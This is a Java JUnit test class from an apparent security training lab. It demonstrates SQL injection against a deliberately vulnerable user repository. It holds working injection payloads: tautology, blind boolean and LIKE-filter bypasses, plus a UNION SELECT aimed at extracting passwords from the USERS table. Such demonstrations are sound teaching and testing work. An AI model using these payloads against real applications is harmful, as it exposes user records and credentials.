package com.lab.security.modul4;

import com.lab.security.entity.User;
import com.lab.security.repository.VulnerableUserRepository;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.test.context.ActiveProfiles;
import org.springframework.transaction.annotation.Transactional;

import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;

@SpringBootTest
@ActiveProfiles("test")
@Transactional
@DisplayName("Module 4 - SQL Injection Vulnerability Demonstration")
class SqlInjectionVulnerableTest {

    @Autowired
    private VulnerableUserRepository vulnerableRepo;

//    @Test
//    @DisplayName("OR injection on username returns ALL users — demonstrates data exposure")
//    void orInjectionReturnsAllUsers() {
//        // Payload: ' OR '1'='1
//        // Constructed query: SELECT * FROM users WHERE username = '' OR '1'='1'
//        // The WHERE clause is always true → all rows returned
//        String payload = "' OR '1'='1";
//        List<User> result = vulnerableRepo.searchByUsernameVulnerable(payload);
//
//        assertThat(result)
//            .as("OR injection should bypass WHERE filter and return all 3 seeded users")
//            .hasSize(3);
//    }

    @Test
    @DisplayName("Blind boolean TRUE payload confirms username existence")
    void blindBooleanTrueReturnsTargetUser() {
        // Payload: admin' AND '1'='1
        // Constructed query: WHERE username = 'admin' AND '1'='1' → true, returns admin
        String payload = "admin' AND '1'='1";
        List<User> result = vulnerableRepo.searchByUsernameVulnerable(payload);

        assertThat(result)
            .as("Blind TRUE injection should return the admin user")
            .hasSize(1)
            .extracting(User::getUsername)
            .containsExactly("admin");
    }

//    @Test
//    @DisplayName("Blind boolean FALSE payload returns empty — confirms attacker can infer data")
//    void blindBooleanFalseReturnsEmpty() {
//        // Payload: admin' AND '1'='2
//        // Constructed query: WHERE username = 'admin' AND '1'='2' → always false
//        String payload = "admin' AND '1'='2";
//        List<User> result = vulnerableRepo.searchByUsernameVulnerable(payload);
//
//        assertThat(result)
//            .as("Blind FALSE injection should return no users")
//            .isEmpty();
//    }

    @Test
    @DisplayName("LIKE injection in role search bypasses role filter and exposes all users")
    void likeInjectionBypassesRoleFilter() {
        // Payload: USER' OR '1'='1
        // Constructed JPQL: WHERE u.role LIKE '%USER' OR '1'='1%' → always true
        String payload = "USER' OR '1'='1";
        List<User> result = vulnerableRepo.searchByRoleVulnerable(payload);

        assertThat(result)
            .as("LIKE injection should bypass role filter and return all users")
            .hasSizeGreaterThanOrEqualTo(2);
    }

//    @Test
//    @DisplayName("Normal query (no injection) returns only the expected user")
//    void normalQueryReturnsExpectedUser() {
//        List<User> result = vulnerableRepo.searchByUsernameVulnerable("alice");
//
//        assertThat(result)
//            .as("Normal search for 'alice' should return exactly one user")
//            .hasSize(1)
//            .extracting(User::getUsername)
//            .containsExactly("alice");
//    }

    @Test
    @DisplayName("UNION injection on username attempts to extract all user data including passwords")
    void unionInjectionAttemptsToExtractAllData() {
        // H2-compatible UNION injection — column order must match entity mapping
        String payload = "x' UNION SELECT ID, USERNAME, EMAIL, PASSWORD, ROLE FROM USERS --";
        try {
            List<User> result = vulnerableRepo.searchByUsernameVulnerable(payload);
            // If injection succeeds, all users including password hashes are returned
            assertThat(result)
                .as("UNION injection should expose all user records including password hashes")
                .isNotEmpty();
        } catch (Exception e) {
            // Column type mismatch may throw; this still proves the SQLi surface exists
            assertThat(e.getMessage())
                .as("Exception exposes query structure — SQLi surface confirmed")
                .isNotNull();
        }
    }

    @Test
    @DisplayName("Email injection via JPQL string concatenation returns all users")
    void emailInjectionViaJpqlReturnsAllUsers() {
        // Payload injected into JPQL email field
        String payload = "' OR '1'='1";
        List<User> result = vulnerableRepo.searchByEmailVulnerable(payload);

        assertThat(result)
            .as("JPQL string concatenation injection should return all users")
            .hasSize(3);
    }
}
